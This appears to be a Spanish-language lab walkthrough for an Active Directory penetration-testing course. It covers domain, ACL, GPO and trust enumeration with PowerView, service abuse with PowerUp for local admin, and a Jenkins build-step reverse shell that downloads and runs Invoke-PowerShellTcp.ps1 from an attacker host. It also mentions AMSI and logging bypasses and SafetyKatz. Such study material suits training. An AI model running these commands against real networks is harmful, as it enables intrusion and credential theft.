# Enumeración

*LO - 01*
## Usuarios del dominio
Enumerar todos los usuarios del dominio quedándonos solo con el nombre de usuario
```shell
Get-DomainUser -Domain dollarcorp.moneycorp.local | select samacountname
```

## Equipos del dominio
Enumerar todos los equipos que se encuentran en el dominio
```shell
Get-DomainComputer -Domain dollarcorp.moneycorp.local | Select-Object -ExpandProperty dnshostname
```

## Administradores del dominio
Enumeraremos los usuarios pertenecientes al grupo Domain Admins
```shell
Get-DomainGroupMember -Domain dollarcorp.moneycorp.local -Identity "Domain Admins" -Recurse
```

## Enterprise Admins del dominio
Enumerar los usuarios pertenecientes al grupo Enterprise Admins del dominio
 ```shell
 Get-DomainGroupMember -Identity "Enterprise Admins" -Domain dollarcorp.moneycorp.local -Recurse
 ```

Al no mostrarnos nada enumeraremos las confianzas viendo que pertenecemos al bosque de *moneycorp.local*
```shell
Get-DomainTrust
```

Una vez descubierto el bosque adaptaremos el comando para buscar en el dominio
```shell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local -Recurse
```

## Enumerar carpetas compartidas
Enumeraremos carpetas compartidas donde los nuestro usuario tenga permisos de de escritura
- Primero deberemos enumerar los equipos de la red y guardarlo en un archivo *.txt*
```shell
Get-DomainComputer | select -ExpandProperty dnshostname | Out-File -FilePath "C:\AD\Tools\servers.txt"
```

- Ahora usaremos la herramienta *PowerHuntShares* importando el modulo de *PowerHuntShares.psm1* y ejecutar *HuntSMBShares*
- Cargamos el modulo
```shell
Import-Module C:\AD\Tools\PowerHuntShares.psm1
```

- Y lo ejecutamos
```shell
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
```

- Obteniendo información sobre los recursos compartidos a los que tenemos acceso
- Ahora podremos pasárnoslo a la maquina local y podremos enumerar con la interfaz grafica de *ShareGraph*
- Pudiendo ver ahora que el recurso compartido llamado *IA* tiene permisos de escritura para todos.

*LO - 02*
## Enumerar las ACL para el grupo de Domain Admins
Enumeraremos las ACL del grupo de Domain Admin, en caso de tener una shell iniciada con comandos recientes si da error hay que abrirse una nueva
```shell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

## Enumerar las ACL donde tenemos permisos interesante
Enumeraremos las ACL de nuestro usuario para saber si hay alguna interesante aplicada sobre el para poder intentar aprovecharnos de ella en un fututo
```shell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student97"}
```

En caso de no ver nada sobre nuestro usuario podemos revisar a que grupos pertenecemos y hacer la enumeración de las ACL de estos
```shell
whomai /groups
```

En cado de encontrar algún grupo interesante como puede ser el de RDPUsers volvemos a lanzar la enumeración
```shell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

*LO - 03*
## Enumerar las OU del dominio dollarcor.moneycorp.local
Enumeraremos todas las Unidades Organizativas del dominio actual
```shell
Get-DomainOU -Domain dollarcorp.moneycorp.local | select name, ou, distinguishedname
```

Una ves enumeradas todas las Unidades Organizativas lo siguiente que podemos hacer es enumerar todos los equipos que pertenecen a una unidad organizativa
```shell
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

## Enumerar las GPO
Enumeraremos las GPO implementadas
```shell
Get-DomainGPO | select displayname
```

También podemos enumerar las GPO que están aplicadas sobre una Unidad Organizativa como puede ser DevOps
Para ello lo primero que necesitaremos sera el nombre de la directiva del atributo gplink de la Unidad Organizativa
```shell
(Get-DomainOU -Identity DevOps).gplink
```

Deberemos de copiar el valor que se encuentra entre corchetes incluyendo estos, a continuación ya podremos enumerar las GPO de la Unidad Organizativa
```shell
Get-DoaminGPO -Idenetity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```

*LO - 04*

## Enumerar todos los dominios en bosque *moneycorp.local*
Enumeraremos todos los dominios que se encuentran en el bosque
```shell
Get-DomainTrust -Domain dollarcorp.moneycorp.local | select TargetName,TrustAttributes,TrustDirection
```

## Enumerar las confianzas del dominio actual
Enumeraremos las confianzas de nuestro dominio pudiendo recoger las confianzas y la dirección relativa de estos
```shell
Get-DomainTrust -Domain dollarcorp.moneycorp.local
```

## Enumerar las confianzas externas al bosque *moneycorp.local*
Enumeraremos todas la confianzas externas del bosque filtrando únicamente por el SID principal
```shell
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

## Enumerar las relaciones de confianzas externas al dominio *dollarcorp.moneycorp.local*
Habiendo enumerado ya las confianzas del bosque y  y del dominio hemos descubierto que hay un bosque externo vamos a enumerarlo verificar las relaciones de confianza
```shell
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```

Dándonos cuenta que no podemos enumerar un bosque o dominio externo al nuestro si intentamos obtener mas información del dominio usando
```shell
Get-DomainForest -Forest eurocorp.local
```

Nos daremos cuenta que no lo podemos enumerar completo ya que no tenemos visibilidad con el

*LO - 05*

# Explotación
## Explotar un servicio en la maquina de estudiante y elevar los privilegios a Administrador Local

Deberemos de tener iniciada una *InviShell* y ejecutar *PowerUp.ps1*
```shell
. C:\AD\Tools\PowerUp.ps1
```

Usaremos un atributo de PowerUp el cual nos permite enumerar todos los servicios vulnerables con las opciones vulnerables habilitadas como *CanRestarr: True*, *Check: Modifiable Services* y *Unquoted service Paths*
```shell
Invoke-AllChecks
```

Hay varios servicios vulnerables, en este caso elegiremos un servicio que disponga de CanRestarr: True como es el servicio de SNMPTRAP
Para abusar de el tendremos que revisar diferentes opciones para abusar de el
```shell
help Invoke-ServiceAbuse -Example
```

Buscaremos cual es la función que nosotros requerimos, en este caso queremos añadir a nuestro usuario al grupo de Administradores Locales
```shell
Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName "scorp\student97" -verbose
```

Verificaremos si pertenecemos al grupo de Adminitradores
```shell
Get-LocalGroupMember -Group "Administrators"
```

Una vez tenemos la cuenta como usuario Administrador local podemos enumerar otras maquinas en el dominio en el que tengamos acceso como administrador local
Primero tendremos que cargar la herramienta Find-PSRemotingLocalAdminAccess.ps1
```shell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

A continuación podremos ejecutarlo viendo en que cuentas tenemos permisos de Administrador Local
```shell
Find-PSRemotingLocalAdminAccess -Verbose
```

Descubriendo permisos de administrador local en otras maquinas en este caso descubrimos permisos de Administrador en Adminsrv, por lo cual nos conectaremos a ella 
```shell
winrs -r:dcorp-adminsrv cmd
```

O también podemos usar
```shell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

## Explotación de Jenkins 172.16.3.11:8080
```ad-todo
Antes de empezar con la explotacion deberemos identificar el servicio del que hablamos en este caso un Jenkins.
Primero deberemos extraer una lista de equipos que haya en el dominio, exportarla y a continuacion hacer una enumeracion de red sobre estos activos
```shell
$Ports = @(80,443,8080,8443,3389,445,135,5985,5986,22,1433,3306,5432)

Get-DomainComputer | Select-Object -ExpandProperty DNSHostName | ForEach-Object {

    $HostName = $_

    try {

        $IP = (Resolve-DnsName $HostName -Type A -ErrorAction Stop |
               Select-Object -First 1 -ExpandProperty IPAddress)

        $OpenPorts = foreach($Port in $Ports) {

            try {

                $TcpClient = New-Object System.Net.Sockets.TcpClient
                $Connect = $TcpClient.BeginConnect($HostName,$Port,$null,$null)

                if($Connect.AsyncWaitHandle.WaitOne(500,$false))
                {
                    $TcpClient.EndConnect($Connect)
                    $TcpClient.Close()
                    $Port
                }
                else
                {
                    $TcpClient.Close()
                }

            } catch {}
        }

        if($OpenPorts)
        {
            [PSCustomObject]@{
                DNSHostName = $HostName
                IP          = $IP
                OpenPorts   = ($OpenPorts -join ",")
            }
        }

    } catch {}
} | Format-Table -AutoSize
```

Accederemos a la web y hay un campo el cual nos muestra diferentes nombres de usuario pertenecientes a la web, antes de hacer un ataque de fuerza bruta probaremos haciendo un User as Password por si hay alguna coincidencia, en este caso *builduser::builduser*

Una vez estamos dentro podemos modificar un proyecto y enviarnos una reverse shell.
Entraremos en un proyecto, y en la parte de configuración -> Build steps podemos meter nuestra reverse shell
```shell
powershell.exe iex (iwr http://172.16.100.97/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.97 -Port 1339
```

La guardaremos y nos pondremos en escucha por el puerto indicado en esta
```shell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
```

Además al tener Privilegios de Administrador Local podremos deshabilitar las reglas de firewall
Después de tenerlo deshabilitado podemos ejecutar el servidor web HFS.exe, al cual le cargaremos los siguientes archivos: *Invoke-PowerShellTCP.ps1*, *Amsi-Byp.txt*, *Loades.exe*, *PowerView.ps1*, *SafetyKatz.exe* y *sbloggingbypass.txt*

Ahora en el Jenkins le damos a Build Now y recibiremos una shell en nuestra maquina
Pudiendo interactuar ahora con la maquina que alberga el Jenkins, en este caso dcorp/ciadmin

*LO - 06*
# Escalada de privilegios
Ahora lo que haremos será escalar privilegios en la maquina de *dcorp-ci*, primero veremos las GPO que tiene implementadas
```shell
Get-DomainGPO -ComputerIdentity DCORP-CI
```

Obteniendo información como que pertenece a la política de *DevOps*, para confirmar que es asi ejecutaremos el siguiente comando
```shell
Get-DomainGPO -Identity 'DevOps Policy'
```

En el primer laboratorio tras la enumeracion descubrimos un recurso compartido en dcorp-ci llamado AI